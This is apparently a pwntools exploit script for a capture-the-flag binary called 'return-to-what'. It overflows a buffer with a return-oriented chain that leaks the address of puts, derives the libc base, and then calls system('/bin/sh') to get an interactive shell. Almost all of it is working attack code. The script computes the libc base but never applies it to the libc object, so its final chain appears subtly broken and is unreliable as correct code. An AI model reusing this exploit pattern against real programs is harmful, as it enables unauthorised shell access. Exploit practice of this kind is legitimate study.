from pwn import *

import pprint

#defining the architecture
context.arch="amd64"

elf=ELF("./return-to-what")

target=elf.process()

target.recvuntil('\n')
target.recvuntil('\n')

offset=56

#instantiaiting the rop object and buidling the chain
#This rop chain is to leak the address of puts and again call the program so that we can send another payload
rop=ROP(elf)
rop.call(elf.symbols[b'puts'],[elf.got[b'puts']])
rop.call(b'vuln')


payload=b"A"*offset + rop.chain()
target.sendline(payload)

puts=u64(target.recvuntil('\n').rstrip().ljust(8,b'\x00'))
log.info(f"puts address = {hex(puts)}")

libc=ELF("libc6_2.31-0ubuntu9.1_amd64.so")

#determining libc base
libc_base=puts-libc.symbols[b"puts"]

log.info(f"libc base : {hex(libc_base)}")

#creating the final rop chain

rop=ROP(libc)
rop.call(b"puts",[next(libc.search(b"/bin/sh"))])
rop.call(b"system",[next(libc.search(b"/bin/sh"))])

payload=b"A"*offset + rop.chain()

target.sendline(payload)
target.interactive()

